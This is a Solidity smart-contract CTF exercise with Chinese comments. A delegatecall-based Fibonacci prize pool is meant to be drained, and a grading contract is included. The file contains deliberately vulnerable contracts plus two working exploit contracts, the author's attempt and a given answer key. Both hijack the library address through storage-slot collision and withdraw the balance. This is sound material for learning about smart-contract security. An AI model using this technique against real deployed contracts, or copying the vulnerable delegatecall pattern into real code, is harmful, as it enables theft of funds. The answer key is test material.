// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
// 这是一个以Fibonaci数列为数学基础的大奖池，此奖池初始拥有10000 wei,想办法把他余额归零。

contract FibonacciLibrary{
    //数列开始的数字
    uint public start;
    uint public calculatedFibNumber;
    //修改数列开始的数字
    function setStart(uint _start) public {
        start = _start;
    }
    
    function setFibonacci(uint n) public {
        calculatedFibNumber = fibonacci(n);
    }
    
    function fibonacci(uint n) internal returns (uint) {
        if (n == 0) return start;
        else if (n == 1) return start + 1;
        else return fibonacci(n - 1) + fibonacci(n - 2);
    }
}

contract FibonacciBalance {
    
    address public fibonacciLibrary;

    uint public calculatedFibNumber;

    uint public start = 3;
    uint public withdrawlCounter;

    string constant fibSig = "setFibonacci(uint256)";

    bool private isInit;
    
    constructor(FibonacciLibrary _fibonacciLibrary) public payable {
        fibonacciLibrary =  address(_fibonacciLibrary);
    }
    
   function withdraw() public {
       withdrawlCounter += 1;
       //这个函数是按照用户调用 withdraw 提款的顺序生成其提款金额的
       //用 delegatecall 的方式调用库函数来生成数值
       (bool success, ) = fibonacciLibrary.delegatecall(abi.encodeWithSignature(fibSig, withdrawlCounter));
       require(success, "delegatecall Fall");
       payable(msg.sender).transfer(calculatedFibNumber * 1);
   }    
   
    fallback() external payable{
        if(isInit){
            require(msg.value == 0);
            (bool success, ) = fibonacciLibrary.delegatecall(msg.data);
            require(success, "delegatecall Fall");
        }else{
            isInit = true;
        }
        
    }
}

contract Check {
    address public fibonacciLib;
    address public fibonacciBalance;
    FibonacciBalance private fiboBalance;
    uint256 public score;
    bool public isInit;

    constructor() public  {
        fiboBalance = new FibonacciBalance(new FibonacciLibrary());
        fibonacciBalance = address(fiboBalance);
        fibonacciLib = fiboBalance.fibonacciLibrary();
    }

    //初始状态：100000 wei
    function initWithValue() public payable{
        if(!isInit){
            (bool suc,) = fibonacciBalance.call{value : 100000}("");
            require(suc, "should init with 100000 wei");
            isInit = true;
        }
    }

    function isCompleted() public {
        require(isInit, "You can't do it without init");
        score = 0;
        if(fiboBalance.fibonacciLibrary() != fibonacciLib){
            score = 30;
            if(fibonacciBalance.balance == 0){
                score = 100;
            }
        }
    }

}

// 我的答案
contract att{
    Check public che;
    address public xiu;
    address public fiboBalance;
    constructor(address addr,address addr1) payable public {
        che = Check(addr);
        xiu = addr1;
        fiboBalance = che.fibonacciBalance();
    }

    // 不能使用下面代码生成calldata
    // uix没有被初始化，a没有值，以后的实践需要注意
    bytes public a = abi.encodeWithSignature("setStart(uint256)", uint256(uint160(address(xiu))));
    bytes public b = abi.encodeWithSignature("setFibonacci(uint256)", 1);
    bytes public a1;
    bytes public b1;
    function attract() public returns(bytes memory,bytes memory){
        a1 = abi.encodeWithSignature("setStart(uint256)", uint256(uint160(address(xiu))));
        b1 = abi.encodeWithSignature("setFibonacci(uint256)", 1);
        // che.initWithValue{value : 100000 wei}();
        fiboBalance.call{value : 0}(a1);
        fiboBalance.call{value : 0}(b1);
        FibonacciBalance(payable(fiboBalance)).withdraw();
        return (a1,b1);
    }
    receive() external payable {}
}
contract att1{
    //数列开始的数字
    uint public start;
    uint public calculatedFibNumber;
    //修改数列开始的数字
    function setFibonacci(uint n) public {
        calculatedFibNumber = 100000;
    }
}


// 给的答案
contract hack {
    Check che;
    constructor(Check _che) public {
        che = _che;
    }

    function pwn(address _addr) public {
        bytes memory data = abi.encodeWithSignature("setStart(uint256)", uint256(_addr));
        bytes memory data2 = abi.encodeWithSignature("setFibonacci(uint256)", 1);
        che.fibonacciBalance().call{value: 0}(data);
        che.fibonacciBalance().call{value: 0}(data2);
        FibonacciBalance(payable(che.fibonacciBalance())).withdraw();
        che.isCompleted();
    }
    
    fallback() external payable {}
}

contract fake {
    //数列开始的数字
    uint public start;
    uint public calculatedFibNumber;
    //修改数列开始的数字
    function setFibonacci(uint n) public {
        calculatedFibNumber = 100000;
    }

}